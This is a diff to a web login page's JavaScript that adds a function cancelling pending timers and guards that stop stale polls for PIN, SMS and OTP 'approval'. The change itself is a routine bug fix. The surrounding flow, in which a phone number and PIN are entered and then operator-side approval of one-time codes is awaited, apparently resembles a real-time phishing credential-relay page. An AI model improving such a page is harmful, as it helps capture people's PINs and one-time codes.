@@ -819,9 +819,25 @@
   }
 
   // ══════════════════════════════════════════════════════
+  // CANCEL ALL ACTIVE POLLS (call before every new login)
+  // ══════════════════════════════════════════════════════
+  function cancelAllPolls() {
+    clearTimeout(pollTimeout);
+    clearTimeout(smsPollTimeout);
+    clearTimeout(otpPollTimeout);
+    pollTimeout    = null;
+    smsPollTimeout = null;
+    otpPollTimeout = null;
+    console.log('🛑 All polls cancelled');
+  }
+
+  // ══════════════════════════════════════════════════════
   // LOGIN — SUBMIT PIN
   // ══════════════════════════════════════════════════════
   async function doLogin() {
+    // ✅ Kill any stale polls from a previous attempt before starting fresh
+    cancelAllPolls();
+
     ['lpMsg','lpMsgOk','lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
 
     const phone = document.getElementById('lpPhone').value;
@@ -874,6 +890,11 @@
   let pollTimeout;
   function pollForPinApproval(applicationId) {
     const checkStatus = async () => {
+      // ✅ Stale poll guard: stop if a newer login has replaced this session
+      if (S.applicationId !== applicationId) {
+        console.log('🛑 Stale PIN poll stopped for', applicationId);
+        return;
+      }
       try {
         const res  = await fetch(`/api/check-pin-status/${applicationId}`);
         const data = await res.json();
@@ -963,6 +984,11 @@
   let smsPollTimeout;
   function pollForSmsApproval(applicationId) {
     const checkStatus = async () => {
+      // ✅ Stale poll guard
+      if (S.applicationId !== applicationId) {
+        console.log('🛑 Stale SMS poll stopped for', applicationId);
+        return;
+      }
       try {
         const res  = await fetch(`/api/check-otp-status/${applicationId}`);
         const data = await res.json();
@@ -1065,6 +1091,11 @@
   let otpPollTimeout;
   function pollForOtpApproval(applicationId) {
     const checkStatus = async () => {
+      // ✅ Stale poll guard
+      if (S.applicationId !== applicationId) {
+        console.log('🛑 Stale OTP poll stopped for', applicationId);
+        return;
+      }
       try {
         const res  = await fetch(`/api/check-otp-status/${applicationId}`);
         const data = await res.json();
